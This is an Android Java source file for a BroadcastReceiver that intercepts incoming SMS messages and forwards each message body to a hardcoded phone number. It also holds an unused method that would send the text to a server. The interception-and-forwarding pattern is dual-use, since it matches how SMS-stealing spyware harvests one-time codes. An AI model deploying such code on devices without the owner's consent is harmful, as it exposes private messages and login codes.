package com.raykibul.smsreceiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

import androidx.core.content.ContextCompat;

import com.raykibul.smsreceiver.model.MyRetrofit;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MyReceiver extends BroadcastReceiver {
    public static final String SMS_RECEIVED="android.provider.Telephony.SMS_RECEIVED";
    public static final String TAG="MyReciver";
    String msg;
    String phoneNo;
    Context context;
    @Override
    public void onReceive(Context context, Intent intent) {
        this.context=context;
        Toast.makeText(context, "SMS RECIEVED", Toast.LENGTH_SHORT).show();
        if(intent.getAction()==SMS_RECEIVED){
            Bundle bundle=intent.getExtras();
            if (bundle!=null){
                Object[] mypdu=(Object[])bundle.get("pdus");
                final  SmsMessage[] message=new SmsMessage[mypdu.length];
                for (int i=0;i<mypdu.length;i++){
                    if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.M){
                        String format=bundle.getString("format");
                        message[i]= SmsMessage.createFromPdu((byte[]) mypdu[i],format);
                    }else {
                        message[i]= SmsMessage.createFromPdu((byte[]) mypdu[i]);
                    }
                    msg=message[i].getMessageBody();
                    phoneNo=message[i].getOriginatingAddress();

                }
              //sendMsgtoServer();
                forwardToMyPHone(msg);
            }
        }
    }



    private  void forwardToMyPHone(String msg){

       try {
            SmsManager sms = SmsManager.getDefault(); // using android SmsManager
            sms.sendTextMessage("+8801781932649", null, msg, null, null);

        } catch (Exception e) {
            Toast.makeText(context, "Sms not Send", Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }


    }

    private void sendMsgtoServer() {
         Call<ResponseBody> sendSmsResponse= MyRetrofit.getApiService().sendSmsResponse(msg);
         sendSmsResponse.enqueue(new Callback<ResponseBody>() {
             @Override
             public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                 Toast.makeText(context, "Response Updated!", Toast.LENGTH_SHORT).show();
             }

             @Override
             public void onFailure(Call<ResponseBody> call, Throwable t) {
                 Toast.makeText(context, "Response Failed!", Toast.LENGTH_SHORT).show();
             }
         });

    }
}